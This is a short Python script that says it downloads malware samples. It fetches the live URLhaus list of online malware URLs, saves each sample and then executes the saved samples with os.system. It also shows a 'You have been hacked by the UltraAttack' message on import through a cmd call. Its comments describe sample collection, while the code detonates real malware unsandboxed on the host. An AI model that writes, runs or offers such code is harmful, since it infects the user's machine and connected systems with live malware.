import urllib3
import os
import sys
import time
os.system("cmd /c msg * You have been hacked by the UltraAttack")
def download_malware(url, output_dir="./malware_samples", timeout=10):
    """Download malware sample"""
    try:
        # Create output directory if it doesn't exist
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
        # Download file
        http = urllib3.PoolManager()
        response = http.request('GET', url, preload_content=False, timeout=timeout)
        
        # Save file
        filename = os.path.join(output_dir, os.path.basename(url))
        with open(filename, 'wb') as f:
            for chunk in response.stream(1024):
                f.write(chunk)
        
        return filename
        
    except urllib3.TimeoutError:
        print(f"Timeout downloading {url}")
        return None
    except Exception as e:
        print(f"Error downloading {url}: {e}")
        return None

def main():
    # Get malware URL list
    try:
        http = urllib3.PoolManager()
        response = http.request('GET', 'https://urlhaus.abuse.ch/downloads/text_online/')
        urls = [line.strip() for line in response.data.decode().splitlines() if line.strip()]
        
        # Download each malware sample
        for url in urls:
            # Check if already downloaded
            filename = os.path.join("./malware_samples", os.path.basename(url))
            if os.path.exists(filename):
                print(f"Already downloaded: {url}")
                # Run the malware
                try:
                    os.system(f"{filename}")
                except:
                    print(f"Error running {filename}")
            else:
                # Download new malware
                print(f"Downloading: {url}")
                download_malware(url)
                
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
